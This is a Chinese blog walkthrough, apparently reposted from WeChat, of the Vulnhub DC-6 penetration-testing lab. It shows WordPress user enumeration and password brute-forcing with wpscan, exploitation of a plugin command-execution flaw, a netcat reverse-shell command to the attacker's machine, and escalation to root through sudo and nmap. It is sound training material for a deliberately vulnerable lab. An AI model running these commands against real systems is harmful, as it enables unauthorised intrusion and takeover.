\> 本文由 \[简悦 SimpRead\](http://ksria.com/simpread/) 转码， 原文地址 \[mp.weixin.qq.com\](https://mp.weixin.qq.com/s/6x\_xSa2hGG2dp5QcmxdjVw)

说明：Vulnhub 是一个渗透测试实战网站，提供了许多带有漏洞的渗透测试靶机下载。适合初学者学习，实践。DC-6 全程只有一个 falg，获取 root 权限，以下内容是自身复现的过程，总结记录下来，如有不足请多多指教。

下载地址：

Download: http://www.five86.com/downloads/DC-6.zip

Download (Mirror): https://download.vulnhub.com/dc/DC-6.zip

Download (Torrent): https://download.vulnhub.com/dc/DC-6.zip.torrent  

目标机 IP 地址：192.168.5.141  
攻击机 kali IP 地址：192.168.5.135

arp-scan -l

![](https://mmbiz.qpic.cn/sz_mmbiz_png/zg4ibGYrEa24PPTIFYpt87nJkyJSqMuASSicqoFcRyJEe34mvO39G0DCoMiceEMVVHt06pIpr1UUjvtVb3H7iap8tQ/640?wx_fmt=png)

nmap -sV -p- -A 192.168.5.141

![](https://mmbiz.qpic.cn/sz_mmbiz_png/zg4ibGYrEa24PPTIFYpt87nJkyJSqMuASpjG9KebqX1dAhe7BWN8zqJibpNGT7VyHp4zNbkJ2sCuHicAicCAL3xCNA/640?wx_fmt=png)

访问 web 服务重定向到 http://wordy/ 修改 host 文件，该站点为 WordPress，kali 中自带工具（wpscan）专门扫 WordPress。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/zg4ibGYrEa24PPTIFYpt87nJkyJSqMuASyewm6uzaxcEJnicb9vd8icNicuTzLKZYPK8IBS0OGN6cU4Ul0bQoF86lQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/zg4ibGYrEa24PPTIFYpt87nJkyJSqMuASRsXT3FVrdS1SGRm5BqHPyyXVn3rmicI3Eqg1gicSiaI2fJRdOYcdh7ticA/640?wx_fmt=png)

扫描一下：  

wpscan --url http://wordy/ -e u

存在多个用户 admin/graham/mark/sarah/jens

![](https://mmbiz.qpic.cn/sz_mmbiz_png/zg4ibGYrEa24PPTIFYpt87nJkyJSqMuASaeD7zT2LonD8ibicBKQiaLnHZ19nqUc7uiaIt630w9LxFJ4YDorUSEicNUw/640?wx_fmt=png)

该作者是有提示的。  

![](https://mmbiz.qpic.cn/sz_mmbiz_png/zg4ibGYrEa25Zx6sHyzjJgWbicA6nnEwRsfsTzgY63XBkVeCa39Or6tSz5TedrZakictMxRNMMPLMf7iaTYkkzRDDg/640?wx_fmt=png)

字典较大，爆破需要很长的时间要有耐心，解压字典后使用 wpscan 进行爆破。

```
gunzip -c rockyou.txt.gz > rockyou.txt
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/zg4ibGYrEa24PPTIFYpt87nJkyJSqMuASeLUO9RF6Pd7LmibQce6rrjnWG0EBugfzeINJSGhicnpb6A1ic5uvCI2zw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/zg4ibGYrEa24PPTIFYpt87nJkyJSqMuASbnAPRXKzX4YjcJqso1mOHIssmRmSEqe0W5ry9TDA02YEDvgZ7qFibBQ/640?wx_fmt=png)

```
wpscan --url http://wordy/  -P /usr/share/wordlists/rockyou.txt  -U DCusernames
```

爆破出用户是 mark，密码是 helpdesk01，WordPress 后台登录。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/zg4ibGYrEa25Zx6sHyzjJgWbicA6nnEwRsaj3sAOfhVYyJNOftMoIk60q0cBE8UPBAP7aBGxib6urNygggMIGAgMw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/zg4ibGYrEa25Zx6sHyzjJgWbicA6nnEwRs2BBELjX33lal6zARHgGJCic0icPfevZ9WRjo9MWMK64ArvIJ4mTVfVDQ/640?wx_fmt=png)

发现后台页面中安装了 Activity monitor,WordPress Activity monitor 插件存在命令执行的漏洞。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/zg4ibGYrEa24PPTIFYpt87nJkyJSqMuASO2lSx65a87WcQibfgLREcveUFZZ7J9WYxDA9cmEZkia5y9O9kpEicuedA/640?wx_fmt=png)

执行命令。  

![](https://mmbiz.qpic.cn/sz_mmbiz_png/zg4ibGYrEa24PPTIFYpt87nJkyJSqMuASw9qicCWbwgiceGPCxgBsjTcYRczB8ibrMpIsw3Jh0h09cjU0DQQ7VmaKA/640?wx_fmt=png)

反弹 shell，切换交互模式。

```
nc 192.168.5.135 7777 -e /bin/bash
python -c 'import pty;pty.spawn("/bin/bash")'
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/zg4ibGYrEa24PPTIFYpt87nJkyJSqMuASVklSFfc8AN6KbJRdVicK83IVbFQc4Or7gllR1RvIibibiauClMM2QEV5JA/640?wx_fmt=png)

到 home 目录下看看。

www-data@dc-6:/home/mark/stuff$ cat things-to-do.txt

发现新用户的以及密码 graham/GSo7isUM1D4

![](https://mmbiz.qpic.cn/sz_mmbiz_png/zg4ibGYrEa24PPTIFYpt87nJkyJSqMuAS34YBs9TrzibSDD6z7lEPIZGLNtOicJeZytcu5ppzxJx3A4Vx9ots5Liaw/640?wx_fmt=png)

graham 使用 ssh 链接一下。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/zg4ibGYrEa24PPTIFYpt87nJkyJSqMuASylWZUQjLGauNdPt6UMDYFgfOon2WIuussbsTLRibOic0GtkuGicA9pLGw/640?wx_fmt=png)

sudo -l 查看一下能够执行 root 权限的命令。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/zg4ibGYrEa24PPTIFYpt87nJkyJSqMuASzkmGR4IAUNEtahKbpgEz6nqrlfDEiazzQkuoxvSlnqCc4RfL9x473mg/640?wx_fmt=png)

sudo -u 以指定的用户作为新的身份（不指定则为 root 权限）。 修改该脚本：echo "/bin/bash" > backups.sh  切换用户 jens。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/zg4ibGYrEa24PPTIFYpt87nJkyJSqMuAS5ZWjVRsxscnmxicicQR7NJdiakzNbcAoGB08521pMviaKEHDucd6QWKiaJA/640?wx_fmt=png)

发现 nmap 可以以 root 权限执行。写一个 nmap 脚本，利用 nmap 提权。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/zg4ibGYrEa24PPTIFYpt87nJkyJSqMuASXC0hdBUP8iaJGwWCCvno6VfOWeLtzT8aqDbibEyagiaGkOyFvtVbA9ysg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/zg4ibGYrEa25Zx6sHyzjJgWbicA6nnEwRsVb0k2F1vpAYeMXoVPeW2TodK4WxoSgTgAOiasEylo0KDZ484orTxC9g/640?wx_fmt=png)

nmap 提权成功，拿到 flag。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/zg4ibGYrEa24PPTIFYpt87nJkyJSqMuASVSjCxn3kgc4N1Bn51mic81aTaasSiaMpBWSY74enOVvKlS5WVOhrSUBg/640?wx_fmt=png)